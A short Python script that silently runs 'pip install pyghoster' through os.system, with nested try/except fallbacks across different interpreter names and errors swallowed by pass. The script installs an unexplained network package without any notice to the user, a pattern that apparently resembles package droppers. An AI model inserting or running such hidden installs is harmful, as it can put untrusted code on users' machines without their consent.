import os
try:
    os.system("python.exe -m pip install pyghoster")
except:
  try:
      os.system("python3 -m pip install pyghoster")
  except:
      try:
          os.system("pip install pyghoster")
      except:
          pass
